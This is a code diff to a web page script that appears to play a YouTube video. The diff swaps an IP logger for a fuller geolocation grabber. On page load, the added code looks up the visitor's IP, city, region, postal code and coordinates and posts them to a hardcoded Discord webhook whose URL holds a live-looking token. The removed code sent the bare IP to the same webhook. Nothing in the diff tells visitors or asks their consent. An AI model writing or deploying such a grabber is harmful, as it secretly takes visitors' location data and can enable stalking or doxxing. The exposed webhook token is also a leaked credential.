@@ -174,34 +174,64 @@
                 event.target.setVolume(50); // Set volume to 50%
                 event.target.playVideo(); // Start playing the video
             }
-
-            // Get user's IP address using ipify
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    console.log('User IP Address:', data.ip);
-                    
-                    // Send the IP address to your Discord webhook
-                    fetch('https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: `New IP Address: ${data.ip}`
-                        })
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('IP address sent to webhook successfully!');
-                        } else {
-                            console.error('Failed to send IP address to webhook.');
-                        }
-                    })
-                    .catch(error => console.error('Error sending IP address:', error));
+            
+            fetch('https://ipapi.co/json/')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Erreur réseau');
+                    }
+                    return response.json();
                 })
-                .catch(error => console.error('Error fetching IP address:', error));
+                .then(data => {
+                    const ipInfo = `
+                        <p><strong>Adresse IP :</strong> ${data.ip}</p>
+                        <p><strong>Ville :</strong> ${data.city}</p>
+                        <p><strong>Région :</strong> ${data.region}</p>
+                        <p><strong>Pays :</strong> ${data.country_name}</p>
+                        <p><strong>Code postal :</strong> ${data.postal}</p>
+                        <p><strong>Latitude :</strong> ${data.latitude}</p>
+                        <p><strong>Longitude :</strong> ${data.longitude}</p>
+                    `;
+                    document.getElementById('ipInfo').innerHTML = ipInfo;
+                    
+                    // Envoi des informations au webhook Discord
+                    sendToWebhook(data);
+                })
+                .catch(error => {
+                    document.getElementById('ipInfo').innerHTML = `<p>Une erreur s'est produite : ${error.message}</p>`;
+                });
         });
+
+        function sendToWebhook(data) {
+            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ';
+            const message = {
+                content: `Informations sur l'adresse IP:\n\n` +
+                         `**Adresse IP:** ${data.ip}\n` +
+                         `**Ville:** ${data.city}\n` +
+                         `**Région:** ${data.region}\n` +
+                         `**Pays:** ${data.country_name}\n` +
+                         `**Code postal:** ${data.postal}\n` +
+                         `**Latitude:** ${data.latitude}\n` +
+                         `**Longitude:** ${data.longitude}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erreur lors de l\'envoi au webhook');
+                }
+                console.log('Message envoyé au webhook avec succès!');
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi au webhook:', error);
+            });
+        }
     </script>
 </body>
 </html>
